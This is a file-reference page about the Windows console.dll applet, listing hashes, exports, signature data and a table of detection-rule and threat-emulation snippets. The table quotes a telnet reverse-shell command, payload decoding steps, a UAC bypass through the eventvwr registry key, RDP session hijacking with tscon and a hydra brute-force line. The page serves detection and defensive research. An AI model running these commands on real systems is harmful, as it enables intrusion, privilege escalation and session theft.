---
title: console.dll | Control Panel Console Applet
excerpt: What is console.dll?
---

# console.dll 

* File Path: `C:\Windows\SysWOW64\console.dll`
* Description: Control Panel Console Applet

## Hashes

Type | Hash
-- | --
MD5 | `259E1DADB6D8AC165910168C31C1EB34`
SHA1 | `3738AAC70C63D0175D6F77A2C7BD484C9103FF5C`
SHA256 | `803ACECB6E62290E79B5480A97FCD46D9A8221FCA55C1FB57C6274193E465B37`
SHA384 | `B5AD2551CEBB9987DE01CEB9B7473E4BA1828823CD8C99E6CEAC3001C9AA7452710AA15BFE127A0CEE6430351CDCA82B`
SHA512 | `25D2A57688B039AD50C9DD4B2EB67995ADAB483927FE7F3FB03ED14B9EEAE0BB57E46B5A51042B57A671B18693705A45EE7A1CEE2C073E9A8BA8AA2007CC55DF`
SSDEEP | `1536:QqN5nBY2wJmcvwyysuJ71uXN0HaQZb8UMb5DB3nZG4/2PjyGBSdo:lB1hMy71uYt4ddzWjyGU`
IMP | `43A6A75FE99ECF3AEB1FA9742B3B2038`
PESHA1 | `91980B26B91946F288ABF12BEA550DE8027ECA93`
PE256 | `EA56CAD4FF855FED747F86D16F5B3716172768282867BA8CC4B6C15A1118043D`

## DLL Exports:

Function Name | Ordinal | Type
-- | -- | --
`DllGetClassObject` | 3 | Exported Function
`DllCanUnloadNow` | 2 | Exported Function
`CPlApplet` | 1 | Exported Function


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: CONSOLE.DLL
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/70
* VirusTotal Link: https://www.virustotal.com/gui/file/803acecb6e62290e79b5480a97fcd46d9a8221fca55c1fb57c6274193e465b37/detection/


## Possible Misuse

*The following table contains possible examples of `console.dll` being misused. While `console.dll` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [lnx_apt_equationgroup_lnx.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/lnx_apt_equationgroup_lnx.yml) | `- '/bin/telnet locip locport < /dev/console \| /bin/sh'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [lnx_apt_equationgroup_lnx.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/lnx_apt_equationgroup_lnx.yml) | `- '< /dev/console \| uudecode && uncompress'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [lnx_apt_equationgroup_lnx.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/lnx_apt_equationgroup_lnx.yml) | `- '</dev/console \|uudecode > /dev/null 2>&1 && uncompress'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [lnx_apt_equationgroup_lnx.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/lnx_apt_equationgroup_lnx.yml) | `- '&& telnet * 2>&1 </dev/console'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_interactive_logons.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_susp_interactive_logons.yml) | `description: Detects interactive console logons to Server Systems` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_use_of_csharp_console.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_use_of_csharp_console.yml) | `title: Suspicious Use of CSharp Interactive Console` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_use_of_csharp_console.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_use_of_csharp_console.yml) | `description: Detects the execution of CSharp interactive console by PowerShell` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [RunCmd_X64.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/RunCmd_X64.yml) | `Description: Launch command file and hide the console window` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Eventvwr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Eventvwr.yml) | `Description: During startup, eventvwr.exe checks the registry value HKCU\Software\Classes\mscfile\shell\open\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Sqlps.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqlps.yml) | `Description: Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Sqltoolsps.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqltoolsps.yml) | `Description: Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.` | 
[malware-ioc](https://github.com/eset/malware-ioc) | [invisimole](https://github.com/eset/malware-ioc/blob/master/invisimole/README.adoc) | `[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Console]` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [invisimole](https://github.com/eset/malware-ioc/blob/master/invisimole/README.adoc) | `[HKEY_CURRENT_USER\Software\Microsoft\Direct3D] or [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Console]` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #4: Windows - Disable Windows Recovery Console Repair [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #4: Windows - Disable Windows Recovery Console Repair [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1033.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md) | for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^\| findstr "Active Disc"') do @echo %i \| find /v "#" \| find /v "console" \|\| echo %j > usernames.txt | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1033.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md) | @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^\| findstr "Active Disc"') do @echo %i \| find /v "#" \| find /v "console" \|\| echo %j > usernames.txt | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1056.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md) | # Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1112.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md) | Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message "The operation completed successfully." | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1201.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md) | Lists the password complexity policy to console on Ubuntu Linux. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1201.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md) | Lists the password complexity policy to console on CentOS/RHEL 7.x Linux. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1201.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md) | Lists the password complexity policy to console on CentOS/RHEL 6.x Linux. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1201.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md) | Lists the password expiration policy to console on CentOS/RHEL/Ubuntu. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1201.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md) | Lists the local password policy to console on Windows. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1201.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md) | Lists the domain password policy to console on Windows. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1201.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md) | Lists the password policy to console on macOS. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1490.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md) | - [Atomic Test #4 - Windows - Disable Windows Recovery Console Repair](#atomic-test-4---windows---disable-windows-recovery-console-repair) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1490.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md) | ## Atomic Test #4 - Windows - Disable Windows Recovery Console Repair | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1490.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md) | Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.004/T1546.004.md) | <code>~/.bash_profile</code> is executed for login shells and <code>~/.bashrc</code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the <code>~/.bash_profile</code> script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the <code>~/.bashrc</code> script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.013.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.013/T1546.013.md) | [PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles)  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1548.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md) | Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1563.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1563.002/T1563.002.md) | Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [python](https://github.com/redcanaryco/atomic-red-team/blob/master/execution-frameworks/contrib/python/README.md) | /v "#" \| find /v "console" \|\| echo %j > usernames.txt | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [airbnb_binaryalert.yar](https://github.com/Neo23x0/signature-base/blob/master/vendor/yara/airbnb_binaryalert.yar) | $s4 = "To deliver powershell payload, use '--cmdfile script.ps1' but inside powershell console" ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_eqgrp_apr17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp_apr17.yar) | $x2 = "Remote Usage: /bin/telnet locip locport < /dev/console \| /bin/sh\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_fin7.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_fin7.yar) | $s1 = "\\par var console=\\{\\};console.log=function()\\{\\};" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_op_wocao.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_op_wocao.yar) | description = "Strings from the console.jsp webshell" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_sandworm_exim_expl.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_sandworm_exim_expl.yar) | $s6 = "mysqld --user=mysql --init-file=/etc/opt/init-file.txt --console" ascii fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [cn_pentestset_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar) | $s12 = "if (_Debug) System.Console.WriteLine(\"\\ninserting filename into CDS:" ascii /* PEStudio Blacklist: strings */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_hacktools.yar) | $s3 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_hacktools.yar) | $s5 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_empire.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_empire.yar) | $s3 = "\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s2 = "output.Text += \"\nPS> \" + console.Text + \"\n\" + do_ps(console.Text);" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor_inverse_matches.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor_inverse_matches.yar) | $s2 = "Console Window Host" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


